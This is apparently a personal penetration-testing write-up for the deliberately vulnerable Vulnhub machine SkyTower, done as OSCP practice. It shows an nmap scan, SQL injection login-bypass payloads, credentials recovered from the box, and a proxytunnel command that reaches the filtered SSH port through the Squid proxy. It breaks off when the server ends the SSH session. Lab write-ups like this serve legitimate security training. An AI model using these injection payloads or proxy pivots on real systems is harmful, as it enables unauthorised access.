# Write-up SkyTower (OSCP Like box)

- Box Name : SkyTower
- Difficulty : quite easy
- Time to root : 30 minutes

## Introduction

  While waiting for the start of my OSCP journey, I use to train a lot on HTB and Vulnhub Boxes. Today my internet connection was very poor , so I manage de find a way by downloading Skytower form Vulnhub (This box was recommanded for OSCP training)
  
  
## Enumaration

  ### Port scanning
  
  As usual, i'm starting by doing a TCP scan, with common script and service enumaration :
  
  ```
root@kali ~/v/skytower# nmap -sC -sV 172.20.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-06 08:16 EST
Nmap scan report for 172.20.10.4
Host is up (0.00028s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
_http-server-header: Apache/2.2.22 (Debian)
_http-title: Site doesn't have a title (text/html).
3128/tcp open     http-proxy Squid http proxy 3.1.20
 http-open-proxy: Potentially OPEN proxy.
_Methods supported: GET HEAD
_http-server-header: squid/3.1.20
_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
```

For conclusion, we have a webserver running on port 80, Squid Proxy on 3128, and SSH is filtered...

  ### Port 80
  
  All we have is a simple html login page, running gobuster doesn't reveal much more ...
  No cookie, or strange http headers value, we will come back on this service during exploitation phase.
  
  ### Port 3128
  
  Simple squid, this version doest not seems to be vulnerable to any known vulnerabilites, we need a password to use this service, we are unable to use it now.
  
  ## Exploitation
  
  The first thing to try on this simple login form is SQL injection, we can try do do some login bypass techniques :
  ```admin' OR 1=1--```
  Which return this :
  ```There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11' and password=''' at line 1]```
  
  This is quite good for the following of the pentest, we can now use our SQLi-Fu art to by-pass this login, and the final payload is :
  ```admin' || 1=1#```
  
  Wich give us access to the next page.
  
  The next page is quite useless except a username and a password for john !
  ```
  Username: john
Password: hereisjohn
```

We can now try this on ssh :

```ssh john@172.20.10.4```
But this doesn't work because the port is filtered. Maybe we can bypass this filter by using our creds on Squid Proxy:

```proxytunnel -v -p 172.20.10.4:3128 -P john:hereisjohn -d 127.0.0.1:22 -a 4444```

It works !
We can now try to login on the box with ssh :

```ssh john@127.0.0.1 -p 4444
The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can't be established.
ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:1234' (ECDSA) to the list of known hosts.
john@127.0.0.1's password:hereisjohn
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 127.0.0.1 closed.
root@kali:~#
```

Aaaaand ... we are eject by the server.
